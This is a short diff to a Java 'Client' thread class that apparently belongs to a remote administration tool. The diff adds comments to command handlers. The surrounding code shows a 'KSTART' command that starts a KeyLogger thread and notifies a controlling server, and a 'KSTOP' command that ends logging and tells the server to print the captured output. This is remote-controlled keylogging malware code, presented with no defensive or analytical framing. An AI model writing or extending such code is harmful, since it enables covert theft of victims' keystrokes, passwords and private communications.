@@ -53,6 +53,10 @@ public class Client extends Thread {
 	 */
 	private int id;
 	
+	/**
+	 * A value regularly checked by the keylogging thread
+	 * to know when to close itself.
+	 */
 	private boolean logKeyboard = false;
 	
 	public Client() {
@@ -161,19 +165,25 @@ public class Client extends Thread {
 
 			@Override
 			public String exec(ParsedCommand pCmd) {
+				// Starting keylogging
 				logKeyboard = true;
 				new KeyLogger(_this).start();
+				
+				// Notifying server
 				send("KSTART " + id, new byte[] {});
 				return null;
 			}
 			
 		});
 		
+		// Stop keylogging
 		commands.put("KSTOP", new CommandInterface(){
 
 			@Override
 			public String exec(ParsedCommand pCmd) {
 				logKeyboard = false;
+				
+				// Notifying server when done, to print output
 				send("DONE", new byte[] {});
 				return null;
 			}
